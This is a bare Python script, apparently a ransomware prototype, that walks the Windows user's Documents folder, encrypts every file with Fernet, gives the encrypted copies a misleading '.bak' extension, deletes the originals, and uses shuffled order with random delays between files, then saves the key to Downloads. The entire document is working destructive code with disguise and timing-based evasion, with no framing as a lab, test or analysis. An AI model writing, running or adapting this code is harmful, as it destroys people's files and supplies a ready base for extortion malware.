import os
import random
import time
from cryptography.fernet import Fernet

def generate_key():
    return Fernet.generate_key()

def encrypt_file(path, key, custom_ext):
    f = Fernet(key)
    with open(path, "rb") as file:
        data = file.read()
    encrypted_data = f.encrypt(data)
    encrypted_path = path + custom_ext
    with open(encrypted_path, "wb") as file:
        file.write(encrypted_data)
    os.remove(path)

def main():
    root_path = os.path.join(os.getenv('USERPROFILE'), "Documents")
    key_path = os.path.join(os.getenv('USERPROFILE'), "Downloads")
    key = generate_key()
    custom_ext = ".bak"
    enable_delay = True
    delay_min = 0.5
    delay_max = 5.0

    files_to_encrypt = []
    for folder, _, files in os.walk(root_path):
        for file in files:
            full_path = os.path.join(folder, file)
            if not full_path.endswith(custom_ext):
                files_to_encrypt.append(full_path)

    random.shuffle(files_to_encrypt)

    for filename in files_to_encrypt:
        try:
            encrypt_file(filename, key, custom_ext)
            if enable_delay:
                time.sleep(random.uniform(delay_min, delay_max))
        except Exception as e:
            print(f"Failed to encrypt {filename}: {e}")

    with open(os.path.join(key_path, "filekey.bin"), "wb") as key_file:
        key_file.write(key)

if __name__ == "__main__":
    main()